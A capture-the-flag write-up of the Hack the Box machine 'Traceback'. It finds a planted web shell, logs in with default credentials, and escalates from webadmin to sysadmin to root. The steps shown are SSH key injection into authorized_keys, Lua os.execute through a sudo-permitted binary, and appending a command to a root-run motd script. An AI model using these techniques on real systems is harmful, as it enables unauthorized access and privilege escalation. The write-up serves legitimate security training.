+++
author = "Nick"
categories = ["hack the box", "easy", "webshell", "ssh-keygen", "ssh", "lua"]
date = 2020-08-15T15:00:00Z
description = ""
draft = false
thumbnail = "/images/2020/04/info.png"
slug = "hack-the-box-traceback"
summary = "Welcome back! Today we are going to be doing the Hack the Box machine, Traceback. This is a Linux machine with an Easy difficulty rating, let's jump in!"
tags = ["hack the box", "easy", "webshell", "ssh-keygen", "ssh", "lua"]
title = "Hack the Box - Traceback"
url = "/hack-the-box-traceback"

+++


Welcome back! Today we are going to be doing the Hack the Box machine, Traceback. This is a Linux machine with an Easy difficulty rating, let's jump in!

As always, we start with our `nmap`: `nmap -sC -sV -p- -oA allscan 10.10.10.181`

```
Nmap scan report for 10.10.10.181
Host is up (0.043s latency).
Not shown: 65502 closed ports, 31 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
We have our basic ports open. So we'll head over to the website and see what's being hosted.

![](/images/2020/04/image-38.png)

We see a basic page that shows us the site has been hacked. We'll start a `gobuster` on the site to see what might show up.

`gobuster dir -u http://10.10.10.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40`

![](/images/2020/04/image-39.png)

We see `payload.php` but nothing else really shows up. I played around with the page but couldn't really find anything, probably a rabbit hole. Some googling around for backdoors got me to thinking about WHO the backdoor was put there by. If we search some more for `xH4H` we find a github repo with some Web Shells!

"https://github.com/Xh4H/Web-Shells" description="Some of the best web shells that you might need. Contribute to Xh4H/Web-Shells development by creating an account on GitHub." 

So we'll clone the git repo: `git clone https://github.com/Xh4H/Web-Shells`. Now we will list the content of the gitbut with the `-1` flag, which lists the files line by line. We take that output and put it into a file for fuzzing.

Command:
`ls -1 > shells.lst`

Now that we have a shells listing, we send this file to `gobuster` for discovery.

![](/images/2020/04/image-40.png)

Sure enough we get one! `smevk.php`. If we examine our shell file locally, we see the default password of admin:admin. We use it and log in.

![](/images/2020/04/image-41.png)

![](/images/2020/04/image-42.png)

Well this is fun! Taking a look around the system using this interface we see there are two users, `sysadmin` and `webadmin`.

![](/images/2020/04/image-43.png)

What we want to do is find a way in. If we look around the `webadmin` home directory we see that the user has the ability to read and write to the `approved_keys` file in `.ssh`.

![](/images/2020/04/image-47.png)

We'll generate our own ssh keypair with `ssh-keygen`:

Command:
`ssh-keygen -t rsa`

Great, we have a new keypair. Now we want to take our `id_rsa.pub` file and put it into the `authorized_keys` file on the remote system. Luckily for us, this awesome webshell will allow us to do that. At the top of the shell there is a console function. We click on it and are able to issue commands. We're going to echo our key into the `authorized_key` file and verify it worked.

Command:
`echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfheLTuouvGDVSbcPJ/u56PN9lUd4x0EEaNEYs42Dc+rhSRdqZUH0Gar9/k/HRJcxqLplYJLP42PrF/krB0ERwbif4//bSPVRjmRBOpTpIFw8P4cTufEHpIX3p//U0m/E40f+vaeWaynyjJgMNYGCYx9iTMcDOkcXBujdTmlN5iF5HipwEmlh4TMb5PK6pZpcidJ8D3HgDjewC8IH2n2xthz6MxBH+G10PDTqPpYEHEtuESPKoItnZ4KfFCgXkqj+ttqwprwqwNGFI7So2qMiZjqUdLQjh5UOFToRorJeSMrX2DQNN8lsAegyzCWLZlXyhfWB317loXpYq6yoEPToyFUpp1E7URr5UZ6DvolD+y3DuOjS+F6FlGCWboYm1Z2fBt+DCEbs4uaaDbDvhfKOEI9ztm23TM/z/uorQB6oI4EnIjxiZHJtrx4lRqDjRwx8tTlMLcRGylFbqaAYNBa9CtrWHniUBJunlsjTePeqNofEljOcSubhFRZpnbOON0PM= root@rootflag.io' >> authorized_keys`

Now to verify we can't `cat` the file but we can `tail` it to verify our key is there.

Command:
`tail authorized_keys`

![](/images/2020/04/traceback_echo.gif)

With our key now authorized, we can try to `SSH` in.

Command:
`ssh -i id_rsa webadmin@10.10.10.181`

![](/images/2020/04/traceback_ssh.gif)

Now that we see this cronjob runs every 30 seconds, we can simply `cat` the root

Once we're in we look around but find no `user.txt`. Looks like we'll have to move up another user to `sysadmin` to gain that key. We start our enumeration with the `sudo -l` command. This will tell us if we can run processes as other users. We also download `linpeas` and `pspy64` as well.

![](/images/2020/04/image-49.png)

We can run `luvit` as `sysadmin`. We also have this note in the users directory about using a `lua` tool to practice the language. Some research show that `lua` has a function called `os.execute()` as well as [other commands](http://lua-users.org/wiki/OsLibraryTutorial). We can likely use this to escalate. We'll do the same thing as before, attempt to write our `id_rsa.pub` file into the the `sysadmin`'s `authorized_keys`.

Command:
`sudo -u sysadmin /home/sysadmin/luvit`

This brings us to programing prompt.

Command:
`os.execute("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfheLTuouvGDVSbcPJ/u56PN9lUd4x0EEaNEYs42Dc+rhSRdqZUH0Gar9/k/HRJcxqLplYJLP42PrF/krB0ERwbif4//bSPVRjmRBOpTpIFw8P4cTufEHpIX3p//U0m/E40f+vaeWaynyjJgMNYGCYx9iTMcDOkcXBujdTmlN5iF5HipwEmlh4TMb5PK6pZpcidJ8D3HgDjewC8IH2n2xthz6MxBH+G10PDTqPpYEHEtuESPKoItnZ4KfFCgXkqj+ttqwprwqwNGFI7So2qMiZjqUdLQjh5UOFToRorJeSMrX2DQNN8lsAegyzCWLZlXyhfWB317loXpYq6yoEPToyFUpp1E7URr5UZ6DvolD+y3DuOjS+F6FlGCWboYm1Z2fBt+DCEbs4uaaDbDvhfKOEI9ztm23TM/z/uorQB6oI4EnIjxiZHJtrx4lRqDjRwx8tTlMLcRGylFbqaAYNBa9CtrWHniUBJunlsjTePeqNofEljOcSubhFRZpnbOON0PM= root@rootflag.io' >> /home/sysadmin/.ssh/authorized_keys")`

![](/images/2020/04/traceback_user.gif)

This works and we can now `SSH` into the box as `sysadmin`. We get in and get our first flag! Next up, more enumeration. We launch the copy of `linpeas` we downloaded earlier and see what shows up there. After that runs we also run `pspy64` to see if there are running tasks.

Both show a cron that copies over our motd on login. Hmm.

![](/images/2020/04/image-45.png)

If we look at the properties of the `update-motd.d` directory we see we actually have access to it.

![](/images/2020/04/image-44.png)

We can even modify the `00-header` file! Since this processes runs as root, we'll use it to get the root flag. We simply append a command to `cat` the `root.txt` file to the header and log back in!

Command:
`echo "cat /root/root.txt" >> 00-header`

![](/images/2020/04/traceback_root.gif)

There we have it, our root flag! What was cool about this box was the 'OSINT' if you will on the hacker shells used. A bit different than the normal boxes you see on HTB!

Think about sending me some respect over on HTB if you enjoyed the write-up! Here's my [profile](https://www.hackthebox.eu/home/users/profile/95635).



